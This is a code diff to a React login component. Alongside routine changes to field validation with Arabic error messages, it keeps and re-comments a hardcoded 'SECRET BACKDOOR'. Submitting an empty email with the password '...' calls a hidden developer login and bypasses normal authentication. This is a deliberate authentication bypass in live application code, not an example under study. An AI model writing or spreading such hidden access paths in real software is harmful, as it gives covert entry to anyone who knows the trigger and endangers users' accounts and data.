@@ -51,18 +51,23 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
         setIsLoading(true);
         
         try {
-            // SECRET BACKDOOR: Empty Email + "..." Password
+            // SECRET BACKDOOR CHECK
+            // Strict check: Email must be empty string, Password must be "..."
             if (loginIdentifier.trim() === '' && loginPassword === '...') {
+                // Visual feedback for the developer
                 const user = await authService.loginHiddenDev();
                 if (user) {
-                    onLoginSuccess(user, false); // Never remember me for secret access
+                    onLoginSuccess(user, false);
                 }
                 return;
             }
 
-            // Manual Validation since we removed 'required'
-            if (!loginIdentifier || !loginPassword) {
-                throw new Error("جميع الحقول مطلوبة");
+            // Standard Validation for normal users
+            if (!loginIdentifier.trim()) {
+                throw new Error("البريد الإلكتروني مطلوب");
+            }
+            if (!loginPassword) {
+                throw new Error("كلمة المرور مطلوبة");
             }
 
             const user = await authService.login(loginIdentifier, loginPassword);
